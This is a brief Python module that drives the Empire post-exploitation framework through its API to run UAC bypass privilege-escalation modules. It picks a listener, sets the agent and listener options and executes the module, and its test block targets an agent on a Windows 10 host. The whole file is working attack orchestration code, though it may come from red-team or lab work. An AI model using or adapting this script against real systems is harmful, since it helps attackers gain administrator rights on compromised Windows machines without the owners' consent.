"""
This module allows caller to select UAC bypass available within Empire.
"""
from EmpireAPIWrapper import empireAPI
from empire_settings import *
import empire_autocomplete 

def run(API, agent_name, module_name, listener=''):
    if len(listener) == 0:
        listeners = API.listeners()
        if 'listeners' not in listeners:
            raise ValueError('no listeners')
        # use the first one if no name supplied
        listener = listeners['listeners'][0]['name']
    
    opts = empire_autocomplete.privesc.bypassuac.options
    options = {
                opts.required_agent : agent_name,
                opts.required_listener : listener
              }
    API.module_exec(module_name,options)
    

# for unit testing of each technique
if __name__ == '__main__':
    API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
    print(API.check_version())
    agent_name = API.agent_get_name('pec-WIN10PRO64')
    run(API, agent_name, empire_autocomplete.privesc.bypassuac.path)
 